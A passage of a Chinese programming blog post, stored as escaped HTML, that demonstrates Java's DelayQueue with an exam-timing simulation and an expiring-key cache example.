class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bbk.demo;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.Iterator;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\">import java.util.concurrent.DelayQueue;</span><br><span class=\"line\">import java.util.concurrent.Delayed;</span><br><span class=\"line\">import java.util.concurrent.TimeUnit;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * DelayQueue</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @project Demo</span><br><span class=\"line\"> * @create at 2015-10-6 &#x4E0B;&#x5348;4:37:31</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class Exam {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        </span><br><span class=\"line\">        int studentNumber = 20;</span><br><span class=\"line\">        CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1);</span><br><span class=\"line\">        DelayQueue&lt; Student&gt; students = new DelayQueue&lt;Student&gt;();</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        for (int i = 0; i &lt; studentNumber; i++) {</span><br><span class=\"line\">            students.put(new Student(&quot;student&quot;+(i+1), 30+random.nextInt(120),countDownLatch));</span><br><span class=\"line\">        }</span><br><span class=\"line\">        Thread teacherThread =new Thread(new Teacher(students)); </span><br><span class=\"line\">        students.put(new EndExam(students, 120,countDownLatch,teacherThread));</span><br><span class=\"line\">        teacherThread.start();</span><br><span class=\"line\">        countDownLatch.await();</span><br><span class=\"line\">        System.out.println(&quot; &#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#xFF0C;&#x5168;&#x90E8;&#x4EA4;&#x5377;&#xFF01;&quot;);  </span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class Student implements Runnable,Delayed{</span><br><span class=\"line\"></span><br><span class=\"line\">    private String name;</span><br><span class=\"line\">    private long workTime;</span><br><span class=\"line\">    private long submitTime;</span><br><span class=\"line\">    private boolean isForce = false;</span><br><span class=\"line\">    private CountDownLatch countDownLatch;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Student(){}</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Student(String name,long workTime,CountDownLatch countDownLatch){</span><br><span class=\"line\">        this.name = name;</span><br><span class=\"line\">        this.workTime = workTime;</span><br><span class=\"line\">        //&#x63D0;&#x4EA4;&#x65F6;&#x95F4; = &#x5F53;&#x524D;&#x65F6;&#x95F4; + &#x4F5C;&#x7B54;&#x65F6;&#x95F4;</span><br><span class=\"line\">        this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime();</span><br><span class=\"line\">        this.countDownLatch = countDownLatch;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int compareTo(Delayed o) {</span><br><span class=\"line\">        // &#x6309;&#x7167;&#x4F5C;&#x7B54;&#x65F6;&#x957F;&#x6B63;&#x5E8F;&#x6392;&#x5E8F;&#xFF08;&#x961F;&#x5934;&#x653E;&#x7684;&#x662F;&#x4F60;&#x8BA4;&#x4E3A;&#x6700;&#x5148;&#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x4F53;&#x73B0;&#x4E3A;&#x9700;&#x8981;&#x6700;&#x5148;&#x4EA4;&#x5377;&#xFF0C;&#x6240;&#x4EE5;&#x662F;&#x6B63;&#x5E8F;&#xFF09;</span><br><span class=\"line\">        if(o == null || ! (o instanceof Student)) return 1;</span><br><span class=\"line\">        if(o == this) return 0;</span><br><span class=\"line\">        Student s = (Student)o;</span><br><span class=\"line\">        if (this.workTime &gt; s.workTime) {</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        }else if (this.workTime == s.workTime) {</span><br><span class=\"line\">            return 0;</span><br><span class=\"line\">        }else {</span><br><span class=\"line\">            return -1;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public long getDelay(TimeUnit unit) {</span><br><span class=\"line\">    \t// &#x63D0;&#x4EA4;&#x65F6;&#x95F4; - &#x5F53;&#x524D;&#x65F6;&#x95F4;  &#x7528;&#x6765;&#x5224;&#x65AD;&#x5EF6;&#x8FDF;&#x662F;&#x5426;&#x5230;&#x671F;&#xFF08;&#x5373;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x8BD5;&#x5377;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;take&#x6216;&#x8005;poll&#xFF09;</span><br><span class=\"line\">        // &#x8FD4;&#x56DE;&#x6B63;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x8FD8;&#x6709;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#xFF1A;&#x5EF6;&#x8FDF;&#x5DF2;&#x7ECF;&#x5728;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x524D;&#x5230;&#x671F;&#x3002;&#x8D1F;&#x6570;&#x4EE3;&#x8868;&#x53EF;&#x4EE5;take&#x6216;&#x8005;poll</span><br><span class=\"line\">        return unit.convert(submitTime - System.nanoTime(),  TimeUnit.NANOSECONDS);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        if (isForce) {</span><br><span class=\"line\">            System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; 120&#x5206;&#x949F;&quot; );</span><br><span class=\"line\">        }else {</span><br><span class=\"line\">            System.out.println(name + &quot; &#x4EA4;&#x5377;, &#x5E0C;&#x671B;&#x7528;&#x65F6;&quot; + workTime + &quot;&#x5206;&#x949F;&quot;+&quot; ,&#x5B9E;&#x9645;&#x7528;&#x65F6; &quot;+workTime +&quot; &#x5206;&#x949F;&quot;);  </span><br><span class=\"line\">        }</span><br><span class=\"line\">        countDownLatch.countDown();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public boolean isForce() {</span><br><span class=\"line\">        return isForce;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setForce(boolean isForce) {</span><br><span class=\"line\">        this.isForce = isForce;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic String getName() {</span><br><span class=\"line\">\t\treturn name;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setName(String name) {</span><br><span class=\"line\">\t\tthis.name = name;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic long getWorkTime() {</span><br><span class=\"line\">\t\treturn workTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setWorkTime(long workTime) {</span><br><span class=\"line\">\t\tthis.workTime = workTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic long getSubmitTime() {</span><br><span class=\"line\">\t\treturn submitTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic void setSubmitTime(long submitTime) {</span><br><span class=\"line\">\t\tthis.submitTime = submitTime;</span><br><span class=\"line\">\t}</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class EndExam extends Student{</span><br><span class=\"line\"></span><br><span class=\"line\">    private DelayQueue&lt;Student&gt; students;</span><br><span class=\"line\">    private CountDownLatch countDownLatch;</span><br><span class=\"line\">    private Thread teacherThread;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public EndExam(DelayQueue&lt;Student&gt; students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) {</span><br><span class=\"line\">        super(&quot;&#x5F3A;&#x5236;&#x6536;&#x5377;&quot;, workTime,countDownLatch);</span><br><span class=\"line\">        this.students = students;</span><br><span class=\"line\">        this.countDownLatch = countDownLatch;</span><br><span class=\"line\">        this.teacherThread = teacherThread;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        teacherThread.interrupt();</span><br><span class=\"line\">        Student tmpStudent;</span><br><span class=\"line\">        for (Iterator&lt;Student&gt; iterator2 = students.iterator(); iterator2.hasNext();) {</span><br><span class=\"line\">            tmpStudent = iterator2.next();</span><br><span class=\"line\">            tmpStudent.setForce(true);</span><br><span class=\"line\">            System.out.println(tmpStudent.getName()+&quot;===&quot;+tmpStudent.getDelay(TimeUnit.NANOSECONDS));</span><br><span class=\"line\">            tmpStudent.run();</span><br><span class=\"line\">        }</span><br><span class=\"line\">        countDownLatch.countDown();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class Teacher implements Runnable{</span><br><span class=\"line\"></span><br><span class=\"line\">    private DelayQueue&lt;Student&gt; students;</span><br><span class=\"line\">    public Teacher(DelayQueue&lt;Student&gt; students){</span><br><span class=\"line\">        this.students = students;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            System.out.println(&quot; test start&quot;);</span><br><span class=\"line\">            while(!Thread.interrupted()){</span><br><span class=\"line\">            \tStudent s = students.take();</span><br><span class=\"line\">            \tSystem.out.println(s.getName()+&quot;===&quot;+s.getDelay(TimeUnit.NANOSECONDS));</span><br><span class=\"line\">                s.run();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        } catch (Exception e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"&#x573A;&#x666F;&#x4E8C;\"><a href=\"#&#x573A;&#x666F;&#x4E8C;\" class=\"headerlink\" title=\"&#x573A;&#x666F;&#x4E8C;\"></a>&#x573A;&#x666F;&#x4E8C;</h4><p>&#x5411;&#x7F13;&#x5B58;&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;key&#x8BBE;&#x5B9A;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5C06;&#x8D85;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key&#x6E05;&#x9664;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;<br>1&#x3001;&#x5F53;&#x5411;&#x7F13;&#x5B58;&#x4E2D;&#x6DFB;&#x52A0;key-value&#x5BF9;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;key&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x8FD8;&#x6CA1;&#x6709;&#x8FC7;&#x671F;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x8FD9;&#x4E2A;key&#x5BF9;&#x5E94;&#x7684;&#x65B0;&#x8FC7;&#x671F;&#x65F6;&#x95F4;<br>2&#x3001;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8BA9;DelayQueue&#x5C06;&#x5176;&#x5DF2;&#x4FDD;&#x5B58;&#x7684;key&#x5220;&#x9664;&#xFF0C;&#x9700;&#x8981;&#x91CD;&#x5199;&#x5B9E;&#x73B0;Delayed&#x63A5;&#x53E3;&#x6DFB;&#x52A0;&#x5230;DelayQueue&#x7684;DelayedItem&#x7684;hashCode&#x51FD;&#x6570;&#x548C;equals&#x51FD;&#x6570;<br>3&#x3001;&#x5F53;&#x7F13;&#x5B58;&#x5173;&#x95ED;&#xFF0C;&#x76D1;&#x63A7;&#x7A0B;&#x5E8F;&#x4E5F;&#x5E94;&#x5173;&#x95ED;&#xFF0C;&#x56E0;&#x800C;&#x76D1;&#x63A7;&#x7EBF;&#x7A0B;&#x5E94;&#x5F53;&#x7528;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;</p>\n<p><strong>&#x7F51;&#x4E0A;&#x641C;&#x5230;&#x7684;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *Cache.java</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * Created on 2014-1-11 &#x4E0A;&#x5348;11:30:36 by sunzhenchao mychaoyue2011@163.com</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class Cache&lt;K, V&gt; {</span><br><span class=\"line\"></span><br><span class=\"line\">    public ConcurrentHashMap&lt;K, V&gt; map = new ConcurrentHashMap&lt;K, V&gt;();</span><br><span class=\"line\">    public DelayQueue&lt;DelayedItem&lt;K&gt;&gt; queue = new DelayQueue&lt;DelayedItem&lt;K&gt;&gt;();</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    public void put(K k,V v,long liveTime){</span><br><span class=\"line\">        V v2 = map.put(k, v);</span><br><span class=\"line\">        DelayedItem&lt;K&gt; tmpItem = new DelayedItem&lt;K&gt;(k, liveTime);</span><br><span class=\"line\">        if (v2 != null) {</span><br><span class=\"line\">            queue.remove(tmpItem);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        queue.put(tmpItem);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public Cache(){</span><br><span class=\"line\">        Thread t = new Thread(){</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void run(){</span><br><span class=\"line\">                dameonCheckOverdueKey();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        };</span><br><span class=\"line\">        t.setDaemon(true);</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public void dameonCheckOverdueKey(){</span><br><span class=\"line\">        while (true) {</span><br><span class=\"line\">            DelayedItem&lt;K&gt; delayedItem = queue.poll();</span><br><span class=\"line\">            if (delayedItem != null) {</span><br><span class=\"line\">                map.remove(delayedItem.getT());</span><br><span class=\"line\">                System.out.println(System.nanoTime()+&quot; remove &quot;+delayedItem.getT() +&quot; from cache&quot;);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                Thread.sleep(300);</span><br><span class=\"line\">            } catch (Exception e) {</span><br><span class=\"line\">                // TODO: handle exception</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * TODO</span><br><span class=\"line\">     * @param args</span><br><span class=\"line\">     * 2014-1-11 &#x4E0A;&#x5348;11:30:36</span><br><span class=\"line\">     * @author:&#x5B59;&#x632F;&#x8D85;</span><br><span class=\"line\">     * @throws InterruptedException </span><br><span class=\"line\">     */</span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        int cacheNumber = 10;</span><br><span class=\"line\">        int liveTime = 0;</span><br><span class=\"line\">        Cache&lt;String, Integer&gt; cache = new Cache&lt;String, Integer&gt;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (int i = 0; i &lt; cacheNumber; i++) {</span><br><span class=\"line\">            liveTime = random.nextInt(3000);</span><br><span class=\"line\">            System.out.println(i+&quot;  &quot;+liveTime);</span><br><span class=\"line\">            cache.put(i+&quot;&quot;, i, random.nextInt(liveTime));</span><br><span class=\"line\">            if (random.nextInt(cacheNumber) &gt; 7) {</span><br><span class=\"line\">                liveTime = random.nextInt(3000);</span><br><span class=\"line\">                System.out.println(i+&quot;  &quot;+liveTime);</span><br><span class=\"line\">                cache.put(i+&quot;&quot;, i, random.nextInt(liveTime));</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class DelayedItem&lt;T&gt; implements Delayed{</span><br><span class=\"line\"></span><br><span class=\"line\">    private T t;</span><br><span class=\"line\">    private long liveTime ;</span><br><span class=\"line\">    private long removeTime;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public DelayedItem(T t,long liveTime){</span><br><span class=\"line\">        this.setT(t);</span><br><span class=\"line\">        this.liveTime = liveTime;</span><br><span class=\"line\">        this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int compareTo(Delayed o) {</span><br><span class=\"line\">        if (o == null) return 1;</span><br><span class=\"line\">        if (o == this) return  0;</span><br><span class=\"line\">        if (o instanceof DelayedItem){</span><br><span class=\"line\">            DelayedItem&lt;T&gt; tmpDelayedItem = (DelayedItem&lt;T&gt;)o;</span><br><span class=\"line\">            if (liveTime &gt; tmpDelayedItem.liveTime ) {</span><br><span class=\"line\">                return 1;</span><br><span class=\"line\">            }else if (liveTime == tmpDelayedItem.liveTime) {</span><br><span class=\"line\">                return 0;</span><br><span class=\"line\">            }else {</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS);</span><br><span class=\"line\">        return diff &gt; 0 ? 1:diff == 0? 0:-1;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public long getDelay(TimeUnit unit) {</span><br><span class=\"line\">        return unit.convert(removeTime - System.nanoTime(), unit);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public T getT() {</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setT(T t) {</span><br><span class=\"line\">        this.t = t;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public int hashCode(){</span><br><span class=\"line\">        return t.hashCode();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public boolean equals(Object object){</span><br><span class=\"line\">        if (object instanceof DelayedItem) {</span><br><span class=\"line\">            return object.hashCode() == hashCode() ?true:false;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<blockquote>\n<p>&#x5047;&#x8BBE;&#x73B0;&#x6709;&#x5982;&#x4E0B;&#x4F7F;&#x7528;&#x573A;&#x666F;&#xFF1A;<br>a) &#x5173;&#x95ED;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7A7A;&#x95F2;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x5173;&#x95ED;&#x4E4B;&#x3002;<br>b) &#x7F13;&#x5B58;&#x3002;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8D85;&#x8FC7;&#x4E86;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x9700;&#x8981;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x79FB;&#x51FA;&#x3002;<br>c) &#x4EFB;&#x52A1;&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3002;&#x5728;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#x8BF7;&#x6C42;&#x5E94;&#x7B54;&#x5F0F;&#x4EA4;&#x4E92;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x8D85;&#x65F6;&#x672A;&#x54CD;&#x5E94;&#x7684;&#x8BF7;&#x6C42;&#x3002;</p>\n</blockquote>\n<p>&#x7B28;&#x529E;&#x6CD5;&#x662F;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#xFF0C;&#x904D;&#x5386;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#xFF0C;&#x6328;&#x4E2A;&#x68C0;&#x67E5;&#x3002;<br>&#x4F46;&#x5BF9;&#x8C61;&#x6570;&#x91CF;&#x8FC7;&#x591A;&#x65F6;&#xFF0C;&#x5B58;&#x5728;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x68C0;&#x67E5;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x4E0D;&#x597D;&#x8BBE;&#x7F6E;&#xFF0C;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x8FC7;&#x5927;&#xFF0C;&#x5F71;&#x54CD;&#x7CBE;&#x786E;&#x5EA6;&#xFF0C;&#x591A;&#x5C0F;&#x5219;&#x5B58;&#x5728;&#x6548;&#x7387;&#x95EE;&#x9898;&#x3002;&#x800C;&#x4E14;&#x505A;&#x4E0D;&#x5230;&#x6309;&#x8D85;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#x5904;&#x7406;&#x3002;</p>\n<p>&#x8FD9;&#x573A;&#x666F;&#xFF0C;&#x4F7F;&#x7528;DelayQueue&#x6700;&#x9002;&#x5408;&#x4E86;&#x3002;<br>Delayed &#x5143;&#x7D20;&#x7684;&#x4E00;&#x4E2A;&#x65E0;&#x754C;&#x963B;&#x585E;&#x961F;&#x5217;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x65F6;&#x624D;&#x80FD;&#x4ECE;&#x4E2D;&#x63D0;&#x53D6;&#x5143;&#x7D20;&#x3002;<br>&#x8BE5;&#x961F;&#x5217;&#x7684;&#x5934;&#x90E8;&#x662F;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x540E;&#x4FDD;&#x5B58;&#x65F6;&#x95F4;&#x6700;&#x957F;&#x7684;Delayed&#x5143;&#x7D20;&#xFF08;&#x5373;&#x6700;&#x60F3;&#x4F18;&#x5148;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF09;&#x3002;&#x5982;&#x679C;&#x5EF6;&#x8FDF;&#x90FD;&#x8FD8;&#x6CA1;&#x6709;&#x671F;&#x6EE1;&#xFF0C;&#x5219;&#x961F;&#x5217;&#x6CA1;&#x6709;&#x5934;&#x90E8;&#xFF0C;&#x5E76;&#x4E14; poll &#x5C06;&#x8FD4;&#x56DE; null&#x3002;<br>&#x5F53;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684; getDelay(TimeUnit.NANOSECONDS) &#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 0 